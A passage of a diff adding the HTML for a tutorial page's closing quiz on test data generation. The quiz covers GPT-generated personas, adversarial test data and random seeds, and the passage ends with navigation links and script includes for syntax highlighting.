+                    <div class="quiz-option" data-correct="false">No penalty if data is "anonymized"</div>
+                </div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-question">
+                <p class="quiz-question-text">2. What is the advantage of using GPT for persona generation over basic Faker data?</p>
+                <div class="quiz-options">
+                    <div class="quiz-option" data-correct="false">It's faster and cheaper</div>
+                    <div class="quiz-option" data-correct="true">It creates contextually consistent data where everything makes sense together (college student buys textbooks, not luxury cars)</div>
+                    <div class="quiz-option" data-correct="false">It never makes mistakes</div>
+                    <div class="quiz-option" data-correct="false">It doesn't require an API key</div>
+                </div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-question">
+                <p class="quiz-question-text">3. What is the purpose of adversarial test data?</p>
+                <div class="quiz-options">
+                    <div class="quiz-option" data-correct="false">To make tests run slower</div>
+                    <div class="quiz-option" data-correct="false">To test happy path scenarios</div>
+                    <div class="quiz-option" data-correct="true">To test security vulnerabilities like SQL injection, XSS, and input validation</div>
+                    <div class="quiz-option" data-correct="false">To generate realistic user profiles</div>
+                </div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-question">
+                <p class="quiz-question-text">4. Why should you use random seeds in test data generation?</p>
+                <div class="quiz-options">
+                    <div class="quiz-option" data-correct="false">To make data completely random every time</div>
+                    <div class="quiz-option" data-correct="true">To make tests reproducible and deterministic—same seed generates same data</div>
+                    <div class="quiz-option" data-correct="false">To reduce generation time</div>
+                    <div class="quiz-option" data-correct="false">It's not necessary</div>
+                </div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-results"></div>
+        </div>
+        
+        <!-- Navigation to Next/Previous Tutorial -->
+        <div class="tutorial-nav">
+            <a href="test-generation.html" class="prev">← Previous: Intelligent Test Generation</a>
+            <a href="performance-testing.html" class="next">Next: AI Performance Testing →</a>
+        </div>
+    </div>
+
+    <!-- Footer - Auto-injected by common.js -->
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <script src="../../../vendor/prism/1.29.0/prism.min.js"></script>
+    <script src="../../../vendor/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="../../../vendor/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="../../js/common.js"></script>
+    <script src="../../js/script.js"></script>
+</body>
+
+</html>
